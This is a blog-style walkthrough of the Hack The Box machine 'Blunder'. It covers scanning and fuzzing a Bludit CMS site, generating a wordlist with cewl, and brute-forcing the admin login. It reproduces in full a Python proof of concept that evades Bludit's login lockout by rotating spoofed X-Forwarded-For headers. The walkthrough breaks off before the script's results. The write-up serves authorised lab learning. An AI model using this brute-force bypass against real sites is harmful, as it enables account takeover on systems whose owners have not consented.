---
title: "Blunder"
author: "Me"
date: "June 22, 2020"
output: html_document
---

# Blunder

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (3.9/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_blunder_desc.png){: height="250px" width = "280px"}
</div>

**Tools:** gobuster, wfuzz, cewl, Burp\\
**Techniques:** fuzzing, brute force, "custom" exploitation (script modification), wordlist generation\\
**Keywords:** Bludit CMS\\

<ins>**Lab configuration**</ins>

First, download VirtualBox and Kali (or Parrot). When the machine is imported in VirtualBox, chose *bridged adapter* in the Network tab to have access to the internet. Start and set up the machine as you like.

*Blunder* is a retired box of Hack The Box, and it is necessary to get a **VIP access** in order to do it (10$/month). Then, it's super easy and convenient to connect to it. The first thing to do is to download the connection pack at <https://www.hackthebox.eu/home/htb/access>. Then, open a terminal (make sure you're in the same directory as your connection file (*yourname*.ovpn)) and type the following command:

~~~~
openvpn yourname.ovpn
~~~~~

Where *yourname* is your username on Hack The Box. 
If you're using **Kali 2020**, make sure to add **sudo** to the previous command.

When this is done, just look at the IP of the machine on HTB (Hack the Box). *Blunder* is given the IP 10.10.10.191.\\
We're ready to start !

## 1. Scan the ports of the target
{:style="color:DarkRed; font-size: 170%;"}

Let's start by performing the usual nmap scan with the flags *-sV* to have a verbose output and *-sC* to enable the most common scripts scan.

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_blunder_nmap.png)
</div>

We see that FTP is closed, so our only possibility is port 80.


## 2. Find and exploit vulnerabilities
{:style="color:DarkRed; font-size: 170%;"}

**<u>HTTP</u>**

We saw there is a web server running, so let's check what's there:

<div class="img_container">
![website]({{https://jsom1.github.io/}}/_images/htb_blunder_web.png)
</div>

The page talks about Stephen King, Stadia and USB. A quick look through these articles doesn't reveal anything interesting. We can use Gobuster to search for interesting directories.

<div class="img_container">
![Gobuster]({{https://jsom1.github.io/}}/_images/htb_blunder_gobuster.png)
</div>

The first 3 files look interesting, but we see a 403 error message, meaning we can't access them. Then, there's */admin* and */robots.txt*. This latter is a text file with instructions for search engine crawlers. The file says what directories crawlers cannot search, and it is the first file opened by crawlers when they visit the site. Here, the file contains the following instructions:

<div class="img_container">
![robots.txt]({{https://jsom1.github.io/}}/_images/htb_blunder_robots.png)
</div>

*User-agent* denotes the name of the crawler (which can be found in the Robots Database). Here, \* means that any crawler can access the site.\\
*Allow:* is used to specify what areas of the website can be visited by the crawler. Here, it can go anywhere. This file isn't particularly interesting in this case, but sometimes it lists juicy directories and files that we can inspect to gather information.\\
We also saw */admin*, so let's head there and see it:

<div class="img_container">
![login]({{https://jsom1.github.io/}}/_images/htb_blunder_login.png)
</div>

After trying a few obvious and common credentials, I thought I would use Hydra and try to bruteforce credentials. First, we must know how the request is sent and processed by the server. To do so, we can either use the web developer mode in Firefox and look at the parameters when we submit credentials, or we can use Burp suite.\\
To use Burp, first have to configure the Proxy correctly. In Firefox, go to *Preferences* and search for *proxy*. Open the *Settings...* and make sure that *Manual proxy configuration is selected*. Change *HTTP Proxy* to 127.0.0.1 and port to 80. The settings should look like the following:

<div class="img_container">
![Proxy settings]({{https://jsom1.github.io/}}/_images/htb_blunder_proxy.png)
</div>

When this is done, we can open Burp suite. In the tab *Proxy* and *Intercept*, make sure that *intercept is on*. We're ready to submit random credentials on the login screen and analyze what happens:

<div class="img_container">
![Burp]({{https://jsom1.github.io/}}/_images/htb_blunder_burp.png)
</div>

We see it's a POST request (no surprise), and we see the syntax for the username and password. Note that we also have information on the User-agent (for robots.txt). There is also a cookie and a tokenCSRF. At this point, we should be able to write the Hydra command.

<div class="img_container">
![Hydra]({{https://jsom1.github.io/}}/_images/htb_blunder_hydra.png)
</div>

It found something, but after trying the credentials on the login page, I was sad to see it didn't work. I tried many different commands with different wordlists for username and password (here we see we're not specifying the cookie), and Hydra always found wrong credentials (false positives).\\

I had to look at the forum to get some hints. Many people were talking about **fuzzing**, and I finally understood they were refering to **wfuzz**. Wfuzz is a tool I didn't know about, and is used to bruteforce web applications. After looking at the help (*wfuzz --help*), I fired the following command:

<div class="img_container">
![wfuzz]({{https://jsom1.github.io/}}/_images/htb_blunder_hydra.png)
</div>

Note that I had to try with different wordlists, and filtered the results so that it doesn't show 404 errors. We see some files that Gobuster found, but this time we get a new one: *todo*.\\
Back in the browser, we find the file by adding the *.txt* extension:

<div class="img_container">
![todo]({{https://jsom1.github.io/}}/_images/htb_blunder_todo.png)
</div>

We see that FTP was effectively turned off, but we also get a potential username. Also on the forums, people were talking about creating a custom wordlist to brute force the login. I then discovered another tool I didn't know about, **cewl**. This allows to generate a wordlist from a web page. So let's use it and create a custom wordlist that we'll call *wordlist.txt*:

<div class="img_container">
![cewl]({{https://jsom1.github.io/}}/_images/htb_blunder_cewl.png)
</div>

The flag *-d* represents the depth to spider to, and *-m* the minimum word length (the default is 3). The output is the following:

<div class="img_container">
![cewl2]({{https://jsom1.github.io/}}/_images/htb_blunder_cewl2.png)
</div>

Finally, let's create a *user.txt* file containing some variations of *fergus* (uppercase, lowercase, ...). We can just *nano user.txt* and enter the words. We have a user and a password list, so we can try a bruteforce attack. However, Hydra doesn't seem to work, and after looking at the forum, this might be the reason why:

<div class="img_container">
![bludit documentation]({{https://jsom1.github.io/}}/_images/htb_blunder_bluditdoc.png)
</div>

Apparently, the CMS prevents bruteforce attacks. The versions affected are <= 3.9.2. Now this was a little lucky, but I found the version when inspecting the page:

<div class="img_container">
![bludit version]({{https://jsom1.github.io/}}/_images/htb_blunder_version.png)
</div>

Note that we also saw in the todo note that the version had to be updated, and apparently, it hasn't been done yet.\\
The way to bypass this anti bruteforce mechanism is given in the following proof of concept (available at <https://rastating.github.io/bludit-brute-force-mitigation-bypass/>):

~~~
#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
~~~~~

So we're going to copy this script and adapt it to fit our case. Let's create a script called *bruteforce.py* on the Desktop, paste the POC above and modify it. To do so we can just *touch bruteforce.py* and double click on it to open it in Mousepad.

<div class="img_container">
![bludit version]({{https://jsom1.github.io/}}/_images/htb_blunder_script.png)
</div>

We only had to modify the host and provide a list of usernames and passwords. Once we're done, we can execute it with *python bruteforce.py*:

<ins>**My thoughts**</ins>
I didn't except that... Based on the rating, this box was supposed to be super easy. However, I encountered quite a lot of difficulties.\\
First of all, and even if it might sound obvious, I dind't think about using different tools for the same task. For example, the basic use of Gobuster didn't reveal the todo file. So, I didn't know what to do and had to look at the forums. People suggested to use another tool, wfuzz.\\
Then, just using wfuzz isn't enough. My first attempt didn't give anything, because I wasn't using the right wordlist. Fortunately I knew I had to use wfuzz, so I obviously tried with different wordlists.\\
Lesson learned: try different tools.\\

The foothold was really the best part because I learned 2 new tool, wfuzz and cewl. I feel like the scenario where the password is hidden on the webpage is very CTF-like and not very intuitive. Although it was funny, I had to look on the forum for this part as well.

So, I really liked that box because there was only 1 port to attack, but it wasn't that easy. I learned a lot of things and had fun!
